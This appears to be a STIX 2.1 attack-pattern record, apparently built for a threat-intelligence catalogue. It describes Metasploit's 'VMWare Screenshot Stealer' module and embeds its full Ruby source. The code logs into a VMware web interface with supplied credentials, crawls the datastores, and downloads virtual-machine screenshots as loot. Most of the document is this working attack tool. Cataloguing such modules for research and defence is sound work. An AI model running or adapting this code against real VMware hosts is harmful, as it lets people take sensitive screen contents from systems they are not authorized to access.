{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c793452e-3a10-4ea3-8639-5a5720deadea",
    "created": "2024-08-14T16:27:42.227874Z",
    "modified": "2024-08-14T16:27:42.227879Z",
    "name": "VMWare Screenshot Stealer",
    "description": "Q This module uses supplied login credentials to connect to VMWare via the web interface. It then searches through the datastores looking for screenshots. It will download any screenshots it finds and save them as loot. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/vmware/vmware_screenshot_stealer.rb",
            "external_id": "vmware_screenshot_stealer.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::VIMSoap\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'           => 'VMWare Screenshot Stealer',\n      'Description'    => %Q{\n        This module uses supplied login credentials to connect to VMWare via\n        the web interface. It then searches through the datastores looking for screenshots.\n        It will download any screenshots it finds and save them as loot.\n      },\n      'Author'         => ['theLightCosine'],\n      'License'        => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptString.new('USERNAME', [ true, \"The username to Authenticate with.\", 'root' ]),\n        OptString.new('PASSWORD', [ true, \"The password to Authenticate with.\", 'password' ])\n      ])\n\n    register_advanced_options([OptBool.new('SSL', [ false, 'Negotiate SSL for outgoing connections', true]),])\n  end\n\n  def run_host(ip)\n    if vim_do_login(datastore['USERNAME'], datastore['PASSWORD']) == :success\n      @user_pass = Rex::Text.encode_base64(datastore['USERNAME'] + \":\" + datastore['PASSWORD'])\n      crawl_page('/folder')\n    else\n      print_error \"Login Failure on #{ip}\"\n      return\n    end\n  end\n\n\n\n  def crawl_page(path, parent='')\n    res = send_request_cgi({\n      'uri'     => path,\n      'method'  => 'GET',\n      'cookie'  => @vim_cookie,\n      'headers' => { 'Authorization' => \"Basic #{@user_pass}\"}\n    }, 25)\n    if res\n      @vim_cookie = res.get_cookies\n      if res.code== 200\n        res.body.scan(/<a href=\"([\\w\\/\\?=&;%]+)\">/) do |match|\n          link = match[0]\n          link.gsub!('&amp;', '&')\n          case link\n          when /%2epng?/\n            img_name = Rex::Text::uri_decode(link.match(/\\/([\\w\\?=&;%]+%2epng)/)[1])\n            print_good \"Screenshot Found: #{img_name} Full Path: #{link}\"\n            grab_screenshot(link, img_name)\n          when  /%2e(?!png)/\n            next\n          when parent\n            next\n          else\n            crawl_page(link, path)\n          end\n        end\n      elsif res.code == 401\n        print_error \"Authorization Failure for: #{path}\"\n      end\n    end\n  end\n\n  def grab_screenshot(path, name)\n    res = send_request_cgi({\n      'uri'     => path,\n      'method'  => 'GET',\n      'cookie'  => @vim_cookie,\n      'headers' => { 'Authorization' => \"Basic #{@user_pass}\"}\n    }, 25)\n    if res\n      @vim_cookie = res.get_cookies\n      if res.code == 200\n        img = res.body\n        ss_path = store_loot(\"host.vmware.screenshot\", \"image/png\", datastore['RHOST'], img, name , \"Screenshot of VM #{name}\")\n        print_good \"Screenshot saved to #{ss_path}\"\n      else\n        print_error \"Failed to retrieve screenshot at #{path} HTTP Response code #{res.code} \"\n      end\n    else\n      print_error \"Failed to retrieve screenshot: there was no reply\"\n    end\n\n  end\nend\n"
}